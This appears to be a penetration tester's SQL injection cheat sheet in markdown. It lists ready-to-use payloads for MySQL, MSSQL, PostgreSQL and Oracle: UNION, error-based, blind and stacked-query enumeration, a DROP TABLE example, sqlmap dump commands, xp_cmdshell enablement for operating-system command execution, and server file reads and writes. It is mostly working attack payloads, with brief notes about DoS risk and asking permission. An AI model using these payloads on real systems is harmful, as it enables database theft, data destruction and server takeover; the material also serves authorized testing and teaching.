
!!! alert "note"
	 Think outside the box for injectable parameters. Anything that could be passed to a db is worth testing against. ie UAs, cookies, etc…

!!! alert "note"
	when fuzzing for SQL injection, try 1. replacing valid data with payloads, 2. appending payloads to the end of valid data

!!! alert "note"
	Be very careful with SQL injection payloads, likely potential for DOS, ask for permission if you find something.
## Key Delimiters and Enclosures

- `'`, `"`: Standard string delimiters. E.g., `' OR '1'='1`
- `\\: MySQL identifier quoting. E.g.,` column `= 'value'` `
- `;`: Statement separator. E.g., `SELECT * FROM users; DROP TABLE users;`
- `-`, `/*...*/`: SQL comments. E.g., `-comment`, `/* comment */`
## Injection Patterns

- Basic Injection: `' OR 1=1--`
- Closing Brackets: Try closing out functions or statements. E.g., `')`, `'))`, `')))--`, `%'))-- -`
- Logical Operators: `OR`, `AND`. E.g., `' OR 'x'='x`
- Union Injection: `' UNION SELECT ... --`
- Conditional Time Delays (for blind SQLi):
    - MySQL: `'; SELECT SLEEP(5);--`
    - MSSQL: `'; WAITFOR DELAY '00:00:05';--`
    - Oracle: `'; dbms_lock.sleep(5);--`
    - PostgreSQL: `'; SELECT pg_sleep(5);--`
- Out-of-Band: Through DNS or HTTP. E.g., DNS lookup triggered by SQL query.

## Enumerate DB Type
---
[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

PostgreSQL: 	`SELECT pg_sleep(10)`
MySQL: 	`SELECT SLEEP(10)`
Oracle: 	`dbms_pipe.receive_message(('a'),10)`
Microsoft: 	`WAITFOR DELAY '0:0:10'`
## Automated
---
See [SQLMap](../../🧠%20Methodologies/😏%20Cheatsheets/SQLMap.md) cheat sheet

## Cheat Sheet Per DB Type
---
### Basic
**Logical or**
```Python
' OR 1=1-- -
```
**Union - Enum number of columns**
```Python
' union select null#
' union select null,null#
' union select null,null,null#
```
**Now that you know number of columns, return any query results**
```Python
' union select null,null,version()#
```
```Python
' union select null,null,table_name from information_schema.tables#
```
```Python
' union select null,null,<COLUMN> from <TABLE>#
```
**Column types must match in union select.**
```Python
' union select null(int),1,null,null from <table>#
```
[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
### Blind
**manual logical value extraction**
- Compare results against passed char, if response does not change, we have a valid char
```Python
Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 1) = '7'#
```
```Python
Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 2) = '7.'#
Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 3) = '7.0'#
Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 5) = '7.0.3'#
```
**sqlmap**
```Python
sqlmap -r r --level=2
```
```Python
sqlmap -r r --level=2 --dump
```
```Python
sqlmap -r r --level=2 -T <TABLENAME> --dump
```
### Second-order
**Injection achieved when query is executed not at the injection point, but when the query is retrieved.**
- Signup endpoint, you signup with the user `' or 1=1-- -` and the query only returns data when you navigate to the “accounts” page after your user is created.

## MSSQL

#### **List databases**

Normal
```sql
Select name from sys.databases
```
Error based
```sql
cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
Union Based
```sql
' UNION SELECT name, NULL FROM master..sysdatabases --
```
Stacked Queries
```sql
; SELECT name FROM master..sysdatabases; --
```

#### List Tables:
Normal
```sql
select * from app.information_schema.tables;
```
Error based`
```sql
cast((SELECT TABLE_NAME FROM exercise.information_schema.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
Union Based
```sql
' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --
```
Stacked Queries
```sql
; SELECT * FROM information_schema.tables; --
```
#### List columns

Normal
```sql
select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';
```
Error based
```sql
cast((SELECT+column_name+FROM+exercise.information_schema.columns+where+table_name+%3d+'secrets'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY)+as+integer)
```
Union Based
```sql
' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'table_name' --
```
Stacked Queries:
```sql
; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'table_name'; --
```

#### Command Execution

**Normal**

To use `xp_cmdshell` for command execution, it first needs to be enabled by a user with administrative privileges:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
After enabling, you can execute system commands like so:
```sql
EXEC xp_cmdshell 'your_command_here';
```

**SQLi**
Just like before, you will need to enable the privs first, sometimes they may be enabled by default:
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```
```sql
'; EXEC xp_cmdshell 'your_command_here'; --
```
## MYSQL

#### List databases

Normal
```sql
SHOW DATABASES;
```

Error based (32 character limit)
```sql
' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--
```
Union Based
```sql
' UNION SELECT schema_name, NULL FROM information_schema.schemata --
```
Stacked Queries:
```sql
; SHOW DATABASES; --
```

#### List Tables
Normal
```sql
SHOW TABLES;
```
Error based
```sql
' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--
```

Union Based
```sql
' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --
```
Stacked Queries:
```sql
; SHOW TABLES; --
```
#### List columns
Normal
```sql
SHOW COLUMNS FROM table_name;
```
Error based
```sql
' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1)))--
```

Union Based
```sql
' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --
```
Stacked Queries:
```sql
; SHOW COLUMNS FROM table_name; --
```

#### Read Files:
Normal
```sql
SELECT LOAD_FILE('/path/to/file');
```
SQLi
```sql
' UNION SELECT LOAD_FILE('/path/to/file'), NULL --
```

#### Write Files:
Normal
```sql
SELECT * INTO OUTFILE '/path/to/file' FROM table_name;
```
SQLi
```sql
' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --
```

## Postgres

#### List databases
Normal
```sql
SELECT datname FROM pg_database;
```
Error based
```sql
' (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--
```
Union Based
```sql
' UNION SELECT datname, NULL FROM pg_database --
```
Stacked Queries
```sql
; SELECT datname FROM pg_database; --
```


#### List Tables:
Normal
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
```
Error based
```sql
' (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--
```
Union Based
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --
```
Stacked Queries:
```sql
; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --
```

#### List columns:
Normal
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';
```
Error based
```sql
' (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--
```
Union Based
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --
```
Stacked Queries:
```sql
; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --
```

#### Read Files:

Normal
```sql
SELECT pg_read_file('/path/to/file', 0, 1000000);
```
SQLi
```sql
' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --
```

#### Write Files:
Normal
```sql
COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;
```

## ORACLE

#### List databases:

Normal
```sql
SELECT name FROM v$database;
```

Error based
```sql
' AND (SELECT COUNT(*) FROM v$database) --
```
Union Based
```sql
' UNION SELECT name, NULL FROM v$database --
```
Stacked Queries:
```sql
; SELECT name FROM v$database; --
```
#### List Tables:

Normal
```sql
SELECT table_name FROM all_tables;
```
Error based
```sql
' AND (SELECT COUNT(*) FROM all_tables) --
```
Union Based
```sql
' UNION SELECT table_name, NULL FROM all_tables --
```
Stacked Queries:
```sql
; SELECT table_name FROM all_tables; --
```

#### List columns:

Normal
```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';
```
Error based
```sql
' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --
```
Union Based
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --
```
Stacked Queries:
```sql
; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --
```